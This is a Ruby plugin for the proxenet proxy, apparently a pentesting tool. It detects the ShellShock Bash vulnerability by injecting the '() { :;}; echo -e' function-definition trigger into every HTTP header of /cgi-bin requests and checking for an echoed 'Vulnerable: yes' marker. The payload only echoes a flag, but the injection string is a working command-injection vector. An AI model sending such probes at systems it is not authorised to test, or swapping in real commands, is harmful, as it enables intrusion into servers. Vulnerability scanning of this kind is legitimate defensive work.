#!/usr/bin/env ruby
#

require 'rubygems'

# gem install unirest
require 'unirest'
# gem install http_parser.rb
require 'http/parser'


module ShellShock

  $PLUGIN_NAME = "ShellShock"
  $AUTHOR = "thorgul"

  $vuln_flag = "Vulnerable: yes"
  $vuln_trigger = '() { :;}; echo -e '

  def shellshock_inject(uri, headers, targets)
    vulns = []

    targets.each do |k|
      inj_headers = headers.dup
      inj_headers[k] = "#{$vuln_trigger} '#{$vuln_flag}'"

      response = Unirest.get(uri, headers: inj_headers)

      if response.headers[:vulnerable] == "yes"
        vulns << k
      end
    end

    return vulns
  end

  def proxenet_request_hook(request_id, request, uri)
    puts "ShellShock"

    if uri.include? "/cgi-bin"
      # begin
      vulns = []
      parser = Http::Parser.new
      parser << request

      # puts uri
      headers = parser.headers.dup
      vulns << shellshock_inject(uri, headers, headers.keys)

      headers['This-is-a-random-parameter'] = 'blah'
      vulns << shellshock_inject(uri, headers, ['This-is-a-random-parameter'])

      vulns.flatten!
      if vulns.length > 0
        puts "#{File.basename __FILE__}: #{uri} parameters vulnerable to ShellShock:"
        vulns.each do |v|
          puts "#{File.basename __FILE__}: #{v}"
        end
      end
    end
    return request
  end

  def proxenet_response_hook(response_id, response, uri)
    return response
  end

end

if __FILE__ == $0
  proxenet_request_hook(ARGV[0], ARGV[1], ARGV[2])
end
